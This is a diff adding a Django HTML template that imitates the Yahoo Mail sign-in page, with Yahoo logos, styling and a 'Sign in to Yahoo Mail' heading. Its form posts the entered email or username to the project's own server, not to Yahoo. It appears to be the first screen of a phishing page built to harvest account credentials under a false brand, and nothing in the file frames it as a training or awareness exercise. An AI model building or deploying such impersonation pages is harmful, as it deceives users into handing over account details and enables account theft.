@@ -1,0 +1,101 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/png" href="{% static 'networkbinary/images/yahooo3.jpeg' %}" />
+
+  <title>Yahoo Mail Login</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f5f7fa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      width: 320px;
+    }
+
+    .logo {
+      color: #6001d2;
+      font-size: 28px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      margin: 0;
+      font-size: 20px;
+    }
+
+    .subtitle {
+      color: #555;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    form > input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-bottom: 2px solid #c5c5c5;
+      font-size: 16px;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+
+    form > input[type="email"]:focus {
+      border-bottom-color: #6001d2;
+    }
+
+    label {
+      display: block;
+      text-align: left;
+      font-size: 13px;
+      color: #6001d2;
+      margin: 20px 0 5px;
+    }
+
+    .btn {
+      background: #6001d2;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    .btn:hover {
+      background: #5201b8;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <div class="logo"><img src="{% static 'networkbinary/images/yahoo-top.PNG' %}" alt=""></div>
+    <h2>Sign in to Yahoo Mail</h2>
+    <div class="subtitle">using your Yahoo account</div>
+    <!-- <label for="username"></label> -->
+     <form action="" method="POST">
+      {% csrf_token %}
+    <input type="email" id="username" name="email" placeholder="Username, email, or mobile" />
+    <button class="btn">Next</button>
+    </form>
+  </div>
+</body>
+</html>
+
